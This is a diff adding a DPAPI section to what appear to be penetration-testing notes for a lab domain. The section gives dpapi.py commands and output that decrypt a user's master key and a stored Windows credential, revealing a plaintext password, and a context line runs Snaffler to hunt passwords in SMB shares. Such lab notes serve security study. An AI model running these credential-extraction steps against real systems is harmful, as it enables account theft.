@@ -149,6 +149,51 @@ Search for passwords in smb shares.
 Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 ```
 
+## **DPAPI**
+
+The DPAPI (Data Protection API) is Windows encryption API that applications use to securely store sensitive data, like passwords and certificates. It uses the user’s password (via their master key) to encrypt/decrypt data.
+
+The master key is stored inside `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\{SID}\`
+
+The credentials are stored inside `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\`
+
+We use the following command to decrypt the masterkey using the users's password and sid:
+
+```bash
+[★]$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+```
+
+Now we use the decrypted key to decrypt the credential file.
+
+```bash
+[★]$ dpapi.py credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+
+[CREDENTIAL]
+LastWritten : 2025-01-29 12:55:19
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=Jezzas_Account
+Description : 
+Unknown     : 
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+
+```
+
 ## **References**
 
 <https://www.thehacker.recipes>
